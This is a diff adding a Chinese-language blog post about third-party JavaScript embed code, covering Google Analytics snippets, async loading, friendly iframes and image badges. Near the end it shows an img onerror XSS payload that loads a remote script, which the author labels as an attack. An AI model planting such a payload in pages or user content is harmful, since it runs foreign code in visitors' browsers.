@@ -1,0 +1,222 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <title>第三方Javascript开发系列之投放代码</title>
+    <meta name ="viewport" content ="initial-scale=1, user-scalable=no, width=device-width">
+    <link rel="stylesheet" href="./assets/blog.css" />
+    <link rel="stylesheet" href="./assets/entry.css" />
+    <link rel="stylesheet" href="./assets/highlight.css" />
+</head>
+<body>
+<div class="main">
+    <a class="back" href="./">MZhou's blog</a>
+    <div class="entry">
+        <h1 id="-javascript-">第三方Javascript开发系列之投放代码</h1>
+<blockquote>
+<p>在Web网页开发中有一个有意思的分支，既第三方Javascript脚本的开发。所谓第三方Javascript脚本，就是第三方服务商将自己的服务通过“HTML投放代码”的形式提供给网站使用。由于Javascript的动态特性，一般的第三方服务都会直接或间接的提供Javascript文件给网站页面加载。</p>
+</blockquote>
+<p><img src="https://cloud.githubusercontent.com/assets/249872/18137343/7dfd2d52-6fda-11e6-9ef0-611be372992f.png" alt="tmp1"></p>
+<h2 id="-">投放代码与异步加载</h2>
+<p>本文先从第三方Javascript脚本的重要组成部分“投放代码”讲起。先从一个最例子看起：Google Analytics（以下简称GA），是Google提供的用于网站监测等一系列功能的服务。网站开发者将GA提供的投放代码放到自己网站上需要监测的页面（一般是全站添加）。</p>
+<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- Google Analytics --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="scheme">
+<span class="hljs-list">(<span class="hljs-keyword">function</span><span class="hljs-list">(<span class="hljs-keyword">i</span>,s,o,g,r,a,m)</span>{i<span class="hljs-list">[<span class="hljs-variable">'GoogleAnalyticsObject</span>']=r<span class="hljs-comment">;i[r]=i[r]||function(){</span>
+<span class="hljs-list">(<span class="hljs-keyword">i</span><span class="hljs-list">[<span class="hljs-keyword">r</span>].q=i<span class="hljs-list">[<span class="hljs-keyword">r</span>].q||<span class="hljs-list">[]).push<span class="hljs-list">(<span class="hljs-keyword">arguments</span>)</span>},i<span class="hljs-list">[<span class="hljs-keyword">r</span>].l=1*new Date<span class="hljs-list">()</span><span class="hljs-comment">;a=s.createElement(o),</span>
+m=s.getElementsByTagName<span class="hljs-list">(<span class="hljs-keyword">o</span>)</span><span class="hljs-list">[<span class="hljs-keyword">0</span>]<span class="hljs-comment">;a.async=1;a.src=g;m.parentNode.insertBefore(a,m)</span>
+})<span class="hljs-list">(<span class="hljs-keyword">window</span>,document,<span class="hljs-variable">'script</span>',<span class="hljs-variable">'//www.google-analytics.com/analytics.js</span>',<span class="hljs-variable">'ga</span>')</span><span class="hljs-comment">;</span>
+ga<span class="hljs-list">(<span class="hljs-variable">'create</span>', <span class="hljs-variable">'UA-XXXXX-Y</span>', <span class="hljs-variable">'auto</span>')</span><span class="hljs-comment">;</span>
+ga<span class="hljs-list">(<span class="hljs-variable">'send</span>', <span class="hljs-variable">'pageview</span>')</span><span class="hljs-comment">;</span>
+</span></span></span></span></span></span></span></span></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- End Google Analytics --&gt;</span>
+</code></pre>
+<p> 以上是GA压缩过后的投放代码，可能看起来不是很明显。这里美化一下，看起来会容易些，如下：</p>
+<pre><code class="lang-html"><span class="xml"><span class="hljs-comment">&lt;!-- Google Analytics --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="gherkin">
+/<span class="hljs-keyword">*</span><span class="hljs-keyword">*</span>
+ <span class="hljs-keyword">*</span> Creates a temporary global ga object and loads analytics.js.
+ <span class="hljs-keyword">*</span> Parameters o, a, and m are all used internally. They could have been
+ <span class="hljs-keyword">*</span> declared using 'var', instead they are declared as parameters to save
+ <span class="hljs-keyword">*</span> 4 bytes ('var ').
+ <span class="hljs-keyword">*</span>
+ <span class="hljs-keyword">*</span> <span class="hljs-comment">@param </span></span></span><span class="hljs-expression">{<span class="hljs-variable">Window</span>}</span><span class="xml"><span class="scala">        i <span class="hljs-type">The</span> global context <span class="hljs-class"><span class="hljs-keyword">object</span>.
+</span> * <span class="hljs-annotation">@param</span> </span></span><span class="hljs-expression">{<span class="hljs-variable">HTMLDocument</span>}</span><span class="xml"><span class="scala">  s <span class="hljs-type">The</span> <span class="hljs-type">DOM</span> document <span class="hljs-class"><span class="hljs-keyword">object</span>.
+</span> * <span class="hljs-annotation">@param</span> </span></span><span class="hljs-expression">{<span class="hljs-variable">string</span>}</span><span class="xml"><span class="nginx">        <span class="hljs-title">o</span> Must be <span class="hljs-string">'script'</span>.
+ * <span class="hljs-variable">@param</span> </span></span><span class="hljs-expression">{<span class="hljs-variable">string</span>}</span><span class="xml"><span class="livecodeserver">        g Protocol <span class="hljs-built_in">relative</span> <span class="hljs-built_in">URL</span> <span class="hljs-operator">of</span> <span class="hljs-operator">the</span> analytics.js script.
+ * @<span class="hljs-built_in">param</span> </span></span><span class="hljs-expression">{<span class="hljs-variable">string</span>}</span><span class="xml"><span class="vbnet">        r <span class="hljs-keyword">Global</span> name <span class="hljs-keyword">of</span> analytics <span class="hljs-built_in">object</span>. Defaults <span class="hljs-keyword">to</span> <span class="hljs-comment">'ga'.</span>
+ * @param </span></span><span class="hljs-expression">{<span class="hljs-variable">HTMLElement</span>}</span><span class="xml"><span class="gherkin">   a Async script tag.
+ <span class="hljs-keyword">*</span> <span class="hljs-comment">@param </span></span></span><span class="hljs-expression">{<span class="hljs-variable">HTMLElement</span>}</span><span class="xml"><span class="stata">   <span class="hljs-keyword">m</span> First script tag <span class="hljs-keyword">in</span> document.
+<span class="hljs-comment"> */</span>
+(function(i, s, o, <span class="hljs-keyword">g</span>, r, a, <span class="hljs-keyword">m</span>)</span></span><span class="hljs-expression">{
+  <span class="hljs-variable">i</span>['<span class="hljs-variable">GoogleAnalyticsObject</span>'] = <span class="hljs-variable">r</span>; /<span class="hljs-end-block">/ Acts as a pointer to support renaming.</span>
+  /<span class="hljs-end-block">/ Creates an initial ga</span>() <span class="hljs-variable">function.</span>
+  /<span class="hljs-end-block">/ The queued commands will be executed once analytics.js loads.</span>
+  <span class="hljs-variable">i</span>[<span class="hljs-variable">r</span>] = <span class="hljs-variable">i</span>[<span class="hljs-variable">r</span>] || <span class="hljs-variable">function</span>() {
+    (<span class="hljs-variable">i</span>[<span class="hljs-variable">r</span>]<span class="hljs-variable">.q</span> = <span class="hljs-variable">i</span>[<span class="hljs-variable">r</span>]<span class="hljs-variable">.q</span> || [])<span class="hljs-variable">.push</span>(<span class="hljs-variable">arguments</span>)
+  }</span><span class="xml"><span class="javascript">,
+  <span class="hljs-comment">// Sets the time (as an integer) this tag was executed.</span>
+  <span class="hljs-comment">// Used for timing hits.</span>
+  i[r].l = <span class="hljs-number">1</span> * <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();
+  <span class="hljs-comment">// Insert the script tag asynchronously.</span>
+  <span class="hljs-comment">// Inserts above current tag to prevent blocking in addition to using the</span>
+  <span class="hljs-comment">// async attribute.</span>
+  a = s.createElement(o),
+  m = s.getElementsByTagName(o)[<span class="hljs-number">0</span>];
+  a.async = <span class="hljs-number">1</span>;
+  a.src = g;
+  m.parentNode.insertBefore(a, m)
+})(<span class="hljs-built_in">window</span>, <span class="hljs-built_in">document</span>, <span class="hljs-string">'script'</span>, <span class="hljs-string">'//www.google-analytics.com/analytics.js'</span>, <span class="hljs-string">'ga'</span>);
+<span class="hljs-comment">// Creates a default tracker with automatic cookie domain configuration.</span>
+ga(<span class="hljs-string">'create'</span>, <span class="hljs-string">'UA-XXXXX-Y'</span>, <span class="hljs-string">'auto'</span>);
+<span class="hljs-comment">// Sends a pageview hit from the tracker just created.</span>
+ga(<span class="hljs-string">'send'</span>, <span class="hljs-string">'pageview'</span>);
+</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- End Google Analytics --&gt;</span></span>
+</code></pre>
+<p>其实做的事情很简单：创建一个script标签，设置其src值为GA的第三方Javascript地址。然后插到页面的DOM树中，再初始化ga的配置。这样来实现浏览器“异步”加载第三方Javascript的功能。之所以采用异步实现，是为了不block掉页面正常的逻辑。这也是在开发第三方脚本时很重要的一个要求：</p>
+<blockquote>
+<p>不影响页面原有功能</p>
+</blockquote>
+<p>投放代码的形式有很多种，上面提到的最常见一些。GA其实还提供了另一种投放代码，如下：</p>
+<pre><code class="lang-javascript"><span class="hljs-comment">&lt;!-- Google Analytics --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript">
+<span class="hljs-built_in">window</span>.ga=<span class="hljs-built_in">window</span>.ga||<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{(ga.q=ga.q||[]).push(<span class="hljs-built_in">arguments</span>)};ga.l=+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>;
+ga(<span class="hljs-string">'create'</span>, <span class="hljs-string">'UA-XXXXX-Y'</span>, <span class="hljs-string">'auto'</span>);
+ga(<span class="hljs-string">'send'</span>, <span class="hljs-string">'pageview'</span>);
+</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">async</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">'//www.google-analytics.com/analytics.js'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- End Google Analytics --&gt;</span>
+</code></pre>
+<p>GA的官方文档里面说明了：如果开发者的网站主要服务的用户较大比例使用高级浏览器（Chrome，IE11及以上）或者移动端浏览器占比较大那么推荐使用这种形式的投放代码。为什么呢？</p>
+<p>首先从浏览器的加载执行顺序开始说起。之前已经说到前一种形式是使用JS来动态创建script标签以实现异步加载外链的JS代码，这样可以不Block掉页面。这是它的巨大优势，但是同时也带来了一个劣势。</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">link</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">"http://example.com/test.css?rtt=2"</span> <span class="hljs-attribute">rel</span>=<span class="hljs-value">"stylesheet"</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- body 内容 --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="coffeescript">
+    <span class="hljs-reserved">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>);
+    script.src = <span class="hljs-string">"http://example.com/test.js?rtt=1&amp;a"</span>;
+    <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">'head'</span>)[<span class="hljs-number">0</span>].appendChild(script);
+</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="coffeescript">
+    <span class="hljs-reserved">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>);
+    script.src = <span class="hljs-string">"http://example.com/test.js?rtt=1&amp;b"</span>;
+    <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">'head'</span>)[<span class="hljs-number">0</span>].appendChild(script);
+</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+</code></pre>
+<p> 上述代码中动态加载两份不同的Javascript代码，虽然使用了异步加载Trick，但是实际浏览器下载的过程是这样的：</p>
+<p><img src="https://cloud.githubusercontent.com/assets/249872/18137596/893c2334-6fdb-11e6-862c-84a0b1bea362.jpeg" alt="tmp2"></p>
+<p>因为Javascript可以操作CSSOM，所以浏览器在加载Javascript的时候需要等到CSS完全加载解析完毕之后才能执行 script 标签中的Javascript。再看下面的代码：</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">link</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">"http://example.com/test.css?rtt=2"</span> <span class="hljs-attribute">rel</span>=<span class="hljs-value">"stylesheet"</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- body 内容 --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"http://example.com/test.js?rtt=1&amp;a"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"http://example.com/test.js?rtt=1&amp;b"</span> &gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
+</code></pre>
+<p>上述代码，浏览器是并行下载CSS文件和Javascript文件的，如下图：</p>
+<p><img src="https://cloud.githubusercontent.com/assets/249872/18137604/96a79bca-6fdb-11e6-9d48-765fcfa43240.png" alt="tmp3"></p>
+<p> 现代浏览器（包括 IE8/9 和 Android 2.3/2.2）会预解析查找可以下载的外部文件，并行下载并保持执行不变。不过浏览器无法通过解析HTML来识别动态创建的外链JS地址，所以也无法预下载它们。同时现代浏览器提供了async属性，浏览器会异步的加载async的外链script标签，不会block掉页面（但不保证执行顺序）。这就同时享受到了预下载和异步加载两个福利，带来巨大的性能提升。所以对于使用现代浏览器用户多的网站更推荐使用这种方式。</p>
+<h2 id="-">静态与动态</h2>
+<p>大部分第三方服务是使用CDN来承载自己的外链JS脚本，比如GA。也有一部分是使用动态server（例如PHP服务器）来生成外链的JS脚本，它的优势在于针对不同的开发者提供不同的代码，免去了初始个性化数据的获取请求。例如：</p>
+<pre><code class="lang-html">&lt;script src=<span class="hljs-string">"http://thirdsparty.com/service.js?userid=1234567 /&gt;</span>
+</code></pre>
+<p>服务器会根据userid来生成专供指定开发者网站的代码。这些代码里面通常带有其个性化的配置数据，这样减少了一次配置数据的请求，大大提前了代码执行的时间点。</p>
+<p>当然这样也是有缺点的，最重要的一点就是比较难利用CDN加速。大部分CDN通常根据文件名来缓存静态文件，即使把Javascript脚本改成“service_1234567.js”的形式缓存到CDN上，最后也会因为文件太多导致脚本更新困难的问题。</p>
+<p>除此之外，有些开发者因为安全隐私等原因喜欢将Javascript脚本放在自己的服务器上，然后手动更新。这种情况，动态服务器生成的脚本就比较难满足这个小众需求了。</p>
+<p>另外因为CDN不能使用，所以当动态服务器不稳定时，容易导致加载javascript脚本的时间特别长。虽然可以使用异步加载，但是浏览器在加载东西的时候左上角还是会出现loading。普通用户可以感知到页面还没有加载完成。这会让用户很困惑：“页面都已经展现，可为什么浏览器还在展现，到底在做什么请求呢？”</p>
+<p>甚至会影响到网站本身的业务。因为单个浏览器标签同时下载的连接数有限制，导致其他网页原本的请求被Block掉。</p>
+<h2 id="friendly-iframe">Friendly Iframe</h2>
+<p>为了解决这个问题，<a href="https://github.com/meebo/embed-code">meebo</a>的工程师们想到了一个用Friendly Iframe来解决js加载时候的问题。所谓Friendly Iframe即是iframe的domian和其所在主页面的domain是相同的。例子如下：</p>
+<pre><code class="lang-javascript"><span class="hljs-list">(<span class="hljs-keyword">function</span><span class="hljs-list">(<span class="hljs-keyword">url</span>)</span><span class="hljs-collection">{
+  // 第一部分
+  var dom,doc,where,iframe = document.createElement<span class="hljs-list">(<span class="hljs-keyword">'iframe'</span>)</span><span class="hljs-comment">;</span>
+  iframe.src = <span class="hljs-string">"javascript:false"</span><span class="hljs-comment">;</span>
+  iframe.title = <span class="hljs-string">""</span><span class="hljs-comment">; iframe.role="presentation";  // a11y</span>
+  <span class="hljs-list">(<span class="hljs-keyword">iframe.frameElement</span> || iframe)</span>.style.cssText = <span class="hljs-string">"width: 0; height: 0; border: 0"</span><span class="hljs-comment">;</span>
+  where = document.getElementsByTagName<span class="hljs-list">(<span class="hljs-keyword">'script'</span>)</span><span class="hljs-comment">;</span>
+  where = where<span class="hljs-collection">[where.length - <span class="hljs-number">1</span>]</span><span class="hljs-comment">;</span>
+  where.parentNode.insertBefore<span class="hljs-list">(<span class="hljs-keyword">iframe</span>, where)</span><span class="hljs-comment">;</span>
+
+  // 第二部分
+  try <span class="hljs-collection">{
+    doc = iframe.contentWindow.document;
+  }</span> catch<span class="hljs-list">(<span class="hljs-keyword">e</span>)</span> <span class="hljs-collection">{
+    // IE下如果主页面修改过document.domain，那么访问用js创建的匿名iframe会发生跨域问题，必须通过js伪协议修改iframe内部的domain
+    dom = document.domain;
+    iframe.src=<span class="hljs-string">"javascript:var d=document.open();d.domain='"</span>+dom+<span class="hljs-string">"';void(0);"</span><span class="hljs-comment">;</span>
+    doc = iframe.contentWindow.document;
+  }</span>
+  doc.open<span class="hljs-list">()</span>._l = function<span class="hljs-list">()</span> <span class="hljs-collection">{
+    var js = this.createElement<span class="hljs-list">(<span class="hljs-string">"script"</span>)</span><span class="hljs-comment">;</span>
+    if<span class="hljs-list">(<span class="hljs-keyword">dom</span>)</span> this.domain = dom;
+    js.id = <span class="hljs-string">"js-iframe-async"</span><span class="hljs-comment">;</span>
+    js.src = url;
+    this.body.appendChild<span class="hljs-list">(<span class="hljs-keyword">js</span>)</span><span class="hljs-comment">;</span>
+  }</span><span class="hljs-comment">;</span>
+  doc.write<span class="hljs-list">(<span class="hljs-keyword">'&lt;body</span> onload=<span class="hljs-string">"document._l();"</span>&gt;')</span><span class="hljs-comment">;</span>
+  doc.close<span class="hljs-list">()</span><span class="hljs-comment">;</span>
+}</span>)</span><span class="hljs-list">(<span class="hljs-keyword">'http://some.site.com/script.js'</span>)</span><span class="hljs-comment">;</span>
+</code></pre>
+<p>上述代码分为两个部分：</p>
+<ol>
+<li>创建了一个隐藏的Friendly Iframe然后插入到主页面中</li>
+<li>在iframe onload之后加载javascript脚本</li>
+</ol>
+<p>这样加载Javascript，浏览器就不会出现loading，提升普通用户的体验。当然这还有一个附带的好处，第三方的Javascript代码在独立的iframe中运行，不会与主页面中的JS相互干扰。毕竟即使现在还是有不少小众网站会选择扩展Native对象的方法。作者本人就遇到过有网站开发者修改<code>Array.prototype.push</code>方法的情况。</p>
+<p>当然这有方法还是有缺陷的：投放代码本身太过复杂，网页开发者在实际使用时容易有问题。个人推荐的做法是：如何加载是网站开发者来决定的事情，第三方Javascript脚本应该要支持能想得到的各种奇技淫巧。美国互动广告局（The Interactive Advertising Bureau，简称IAB）提出过一个异步加载广告代码的Best Practice。里面提到了用变量 inDapIF 作为标志，提示Javascript脚本在动态iframe内部执行。所以我们可以用如下方法来判断：</p>
+<pre><code class="lang-javascript">var GLOBAL = <span class="hljs-keyword">window</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">window</span>.<span class="hljs-keyword">parent</span> !== <span class="hljs-keyword">window</span> &amp;&amp; <span class="hljs-keyword">window</span>[<span class="hljs-string">'inDapIF'</span>]) {
+    GLOBAL = <span class="hljs-keyword">window</span>.<span class="hljs-keyword">parent</span>;
+}
+
+<span class="hljs-comment">// 使用GLOBAL替代window</span>
+<span class="hljs-comment">// TODO</span>
+</code></pre>
+<h2 id="-">其他类型的投放代码</h2>
+<p>有些第三方服务不需要直接获取页面的数据，它们只需要有展示自己内容的区域即可，比如：</p>
+<pre><code class="lang-html">&lt;<span class="hljs-tag">iframe</span> <span class="hljs-attribute">height</span>=<span class="hljs-string">'300'</span> scrolling=<span class="hljs-string">'no'</span> src=<span class="hljs-string">'//codepen.io/zmmbreeze/embed/vLbpa/?height=300&amp;theme-id=20219&amp;default-tab=css,result&amp;embed-version=2'</span> frameborder=<span class="hljs-string">'no'</span> allowtransparency=<span class="hljs-string">'true'</span> allowfullscreen=<span class="hljs-string">'true'</span> style=<span class="hljs-string">'width: 100%;'</span>&gt;See the Pen &lt;<span class="hljs-tag">a</span> href=<span class="hljs-string">'http://codepen.io/zmmbreeze/pen/vLbpa/'</span>&gt;DOWN-TO-THE-LINE control <span class="hljs-keyword">for</span> radical web typography&lt;/a&gt; by mzhou (&lt;<span class="hljs-tag">a</span> href=<span class="hljs-string">'http://codepen.io/zmmbreeze'</span>&gt;@zmmbreeze&lt;/a&gt;) on &lt;<span class="hljs-tag">a</span> href=<span class="hljs-string">'http://codepen.io'</span>&gt;CodePen&lt;/a&gt;.
+&lt;/iframe&gt;
+</code></pre>
+<p> 因为使用了不同域名下的iframe，所以是在隔离环境内运行第三方代码。这样第三方代码就不会和开发者站点的代码冲突。而且因为域名不同，天然提供安全性的保障，第三方代码不能获取或修改开发者站点的重要信息。缺点也很明显：就是能做的事情仅限于iframe内部。比较适合不需要访问页面就可以提供内容的需求。</p>
+<p>自从Web 2.0开始，UGC类型的网站越来越多，用户可以自主黏贴文字甚至是HTML代码到网站中去，例如社交网站的简介。所以有的时候第三方服务的使用者并直接是网站开发者，而是网站的用户。网站为了安全一般不会让用户直接贴script表情或者是iframe等特殊HTML标签。所以有些第三方服务提供的投放代码仅仅是一个img标签，将需要展示的内容放在图片中。如果你经常浏览github，你会发现有个集成测试的工具叫做Travis CI。它提供了一段投放代码用于展示开源库的测试状态，如下：</p>
+<pre><code class="lang-html">&lt;<span class="hljs-tag">img</span> src=<span class="hljs-string">"https://travis-ci.org/zmmbreeze/lining.js.svg?branch=master"</span>/&gt;
+</code></pre>
+<p>至此头脑较为发散的同学可能已经想到如下的投放代码了：</p>
+<pre><code class="lang-html"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"#"</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-value">"(function (d) </span></span></span><span class="hljs-expression">{<span class="hljs-variable">var</span> <span class="hljs-variable">s</span> = <span class="hljs-variable">d.createElement</span>('<span class="hljs-variable">script</span>');<span class="hljs-variable">s.src</span>='<span class="hljs-variable">http</span>:/<span class="hljs-end-block">/bqq.gtimg.com</span><span class="hljs-end-block">/da</span><span class="hljs-end-block">/i.js</span>';<span class="hljs-variable">d.getElementsByTagName</span>('<span class="hljs-variable">head</span>')[0]<span class="hljs-variable">.appendChild</span>(<span class="hljs-variable">s</span>);}</span><span class="xml"><span class="hljs-tag"><span class="hljs-value">)(document)"</span> /&gt;</span></span>
+</code></pre>
+<p>虽然这是一段典型的XSS攻击代码，但是它也可以称得上是一种投放代码......</p>
+<blockquote>
+<p>最后说明下：这里没有提到用<code>new Image().src</code>方式（或者其他类似手段）来达到预先异步下载Javascript文件的目的，然后利用了浏览器缓存再次实际下载Javascript文件的时候就直接从缓存里面拉取的方式。因为第三方的Javascript代码基本为了保持文件及时更新，都不会设置很长的缓存，甚至没有缓存。所以这些方法不再讨论的行列里面。</p>
+</blockquote>
+
+    </div>
+
+    <div class="important">
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <ins class="adsbygoogle"
+             style="display:block"
+             data-ad-client="ca-pub-3880667676094519"
+             data-ad-slot="3754878786"
+             data-ad-format="auto"></ins>
+        <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+    </div>
+
+    <div class="info">
+        <h1>MZhou&#39;s blog - Taste of life.</h1>
+        <p>
+            <a href="https://github.com/zmmbreeze" target="_blank">zmmbreeze</a> / <a href="https://twitter.com/zhoumm">@zhoumm</a>
+        </p>
+    </div>
+
+    <!-- Google Tag Manager -->
+    <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-MP42BH"
+    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-MP42BH');</script>
+    <!-- End Google Tag Manager -->
+</div>
+</body>
+</html>
